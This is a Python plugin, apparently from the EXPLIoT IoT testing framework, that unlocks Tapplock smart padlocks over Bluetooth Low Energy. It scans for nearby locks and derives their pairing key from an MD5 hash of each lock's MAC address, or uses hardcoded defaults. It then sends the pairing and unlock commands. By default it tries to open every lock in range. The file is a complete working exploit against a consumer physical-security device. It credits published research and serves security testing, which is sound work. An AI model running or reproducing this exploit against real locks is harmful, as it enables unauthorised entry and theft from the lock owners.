"""Support for testing Tapplock device."""
from hashlib import md5

from expliot.core.tests.test import TCategory, TTarget, Test, TLog
from expliot.core.protocols.radio.ble import Ble, BlePeripheral


class TappUnlock(Test):
    """Test for Tapplock device."""

    TNAMEPREFIX = "TL104A"
    # PAIRPREXIX  = "55AAB4010800"
    PAIRPREXIX = "55aab4010800"
    UNLOCKCMD = "55aa810200008201"
    UNLOCKHNDL = 0xE
    DEFKEY = "01020304"
    DEFSERIAL = "00000000"
    DEFPAIR = PAIRPREXIX + DEFKEY + DEFSERIAL

    def __init__(self):
        """Initialize the test."""
        super().__init__(
            name="unlock",
            summary="Tapplock unlock",
            descr="This plugin allows you to unlock the Tapplocks in close "
            "(BLE) proximity. It was made possible by @cybergibbons "
            "research on the same and he was kind enough to share his "
            "code. NOTE: This plugin needs root privileges. You may run"
            "it as $ sudo expliot. Thanks to @slawekja for providing "
            "the default key1 (01020304) and serial (00000000) values "
            "for earlier version of Tapplock.",
            author="Aseem Jakhar (Original code provided by @cybergibbons)",
            email="aseemjakhar@gmail.com",
            ref=[
                "https://www.pentestpartners.com/security-blog/totally-pwning-the-tapplock-smart-lock/"
            ],
            category=TCategory(TCategory.BLE, TCategory.RD, TCategory.EXPLOIT),
            target=TTarget("Tapplock", "1.0", "Tapplock"),
            needroot=True,
        )

        self.argparser.add_argument(
            "-i",
            "--iface",
            default=0,
            type=int,
            help="HCI interface no. to use for scanning. 0 = hci0, 1 = hci1 and so on. Default is 0",
        )
        self.argparser.add_argument(
            "-a",
            "--addr",
            help="BLE Address of specific Tapplock that you want to unlock. "
            "If not specified, it will scan and attempt to unlock all the Tapplocks found",
        )
        self.argparser.add_argument(
            "-d",
            "--default",
            action="store_true",
            default=False,
            help="Use default key1 (01020304) and Serial (00000000) instead of"
            "generating them from the BLE address",
        )
        self.argparser.add_argument(
            "-t",
            "--timeout",
            default=2,
            type=int,
            help="Scan timeout. Default is 2 seconds",
        )

    def execute(self):
        """Execute the test."""
        try:
            if self.args.addr:
                TLog.generic(
                    "Tapplock BLE Address specified ({})".format(self.args.addr)
                )
                self.unlock(self.args.addr)
            else:
                TLog.generic("Scanning for Tapplocks...")
                devices = Ble.scan(iface=self.args.iface, tout=self.args.timeout)
                for device in devices:
                    name = device.getValueText(Ble.ADTYPE_NAME)
                    if name is not None and name[0:6] == self.TNAMEPREFIX:
                        TLog.success(
                            "Found Tapplock (name={})(mac={})".format(name, device.addr)
                        )
                        self.unlock(device.addr)
        except:  # noqa: E722
            self.result.exception()

    def unlock(self, mac):
        """
        Unlock the specified Tapplock.

        :param mac: The BLE address of the Tapplock
        :return:
        """
        device = BlePeripheral()
        try:
            TLog.trydo("Unlocking Tapplock ({})".format(mac))
            # Get key1 and serial
            pdata = None
            if self.args.default is False:
                rmac = ":".join(mac.upper().split(":")[::-1])
                hash = md5(rmac.encode()).hexdigest()  # nosec
                key1 = hash[0:8]
                serial = hash[16:24]
                TLog.generic(
                    "(Calculated hash={})(key1={})(serial={})".format(
                        hash, key1, serial
                    )
                )
                pdata = self.PAIRPREXIX + key1 + serial
            else:
                TLog.generic(
                    "(default key1={})(default serial={})".format(
                        self.DEFKEY, self.DEFSERIAL
                    )
                )
                pdata = self.DEFPAIR
            # Calculate the checksum
            chksum = 0
            for byte in bytes.fromhex(pdata):
                chksum = chksum + (byte % 255)
            chksumstr = "{:04x}".format(chksum)
            # Create the Pairing data
            pdata = pdata + chksumstr[2:4] + chksumstr[0:2]
            device.connect(mac, addrType=Ble.ADDR_TYPE_RANDOM)
            TLog.trydo("Sending pair data({})".format(pdata))
            device.writeCharacteristic(self.UNLOCKHNDL, bytes.fromhex(pdata))
            TLog.trydo("Sending unlock command({})".format(self.UNLOCKCMD))
            device.writeCharacteristic(self.UNLOCKHNDL, bytes.fromhex(self.UNLOCKCMD))
        finally:
            device.disconnect()
